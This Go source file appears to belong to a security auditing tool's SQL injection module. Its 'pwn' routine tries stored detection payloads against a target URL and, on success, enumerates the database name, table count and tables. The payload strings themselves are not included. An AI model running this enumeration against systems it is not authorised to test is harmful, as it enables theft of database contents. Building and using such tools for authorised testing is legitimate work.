package sql

import (
	"auditor/app"
	"auditor/core/context"
	"auditor/core/utils"
	"auditor/entities"
	"auditor/handlers/common"
	"auditor/payloads/intruder/detect"
	"log"
	"strings"
	"sync"

	"github.com/fatih/color"
)

const (
	base = "/sql"
)

var (
	options *entities.DBOptions
	wg      = sync.WaitGroup{}
	m       = sync.RWMutex{}
)

// ServiceInterface service interface
type ServiceInterface interface {
	TestIntruder(c *context.Context, f *common.PageQuery) (interface{}, error)
	Init(c *context.Context, f *BaseForm) (interface{}, error)

	findPrevious(f *BaseForm) *entities.DBOptions
	fetchDBNameLength(method SQLiBased)
	fetchDBName(method SQLiBased)
	fetchDBTableCount(method SQLiBased)
	fetchDBTables(method SQLiBased)
}

// Service  repo
type Service struct {
	rp      RepoInterface
	context *app.Context
}

// NewService new service
func NewService(c *app.Context) ServiceInterface {
	return &Service{
		context: c,
		rp:      NewRepo(),
	}
}

func (s *Service) TestIntruder(c *context.Context, f *common.PageQuery) (interface{}, error) {
	// payloads := getDetectPayload(SQLIType(f.Type))
	// return payloads, nil
	return nil, nil
}

func (s *Service) Init(c *context.Context, f *BaseForm) (interface{}, error) {
	options = s.findPrevious(f)

	switch validatePwnType() {
	case LengthValidation:
		color.Green("LengthValidation Detection Method: YES")
		s.pwn(LengthValidation)
	}

	return options, nil
}

func (s *Service) pwn(method SQLiBased) interface{} {
	color.Green("[*] RUNNING PWN ...")

	for k, v := range detect.Payloads {
		if validateByMethod(v, method) == 1 {
			options.Payload = k
			payload := detect.NegativePayloads[k]
			// flag := validateByMethod(payload, method)

			log.Println("[*]method ", method)
			log.Println("[*]payload ", payload)

			html := utils.GetPageHTML(options.URL.String(), options.Cookie)
			for _, valueErr := range detect.ErrPayloads {
				if strings.ContainsAny(html, valueErr) {
					color.Yellow("[INFO] PAYLOAD SUCCESSFUL")

					s.fetchDBNameLength(method)
					s.fetchDBName(method)
					s.fetchDBTableCount(method)
					// s.fetchDBTables(method)
					for i := 0; i < options.TableCount; i++ {
						wg.Add(1)
						go func(no int) {
							s.goFetchDBTables(method, no)
							wg.Done()
						}(i)
					}
					wg.Wait()
					// s.fetchColumnsName(method, "categ")
					// getDBRows(method, "categ")

					return nil
				}

			}

			// if flag == 0 {
			// 	color.Yellow("[INFO] PAYLOAD SUCCESSFUL")

			// 	fetchDBNameLength(method)
			// 	fetchDBName(method)
			// 	break
			// }
		}
	}
	return nil
}

func (s *Service) findPrevious(f *BaseForm) *entities.DBOptions {
	options := &entities.DBOptions{}
	err := s.rp.FindOneByPrimitiveM(filterURL(f.URL), options)
	if err != nil {
		options = entities.URLOptions(f.URL, f.Param, f.Cookie)
		_ = s.rp.Create(options)
		return options
	}

	color.Red("\n[*] FOUND THE URL!")
	options.FromDB = true

	return options
}
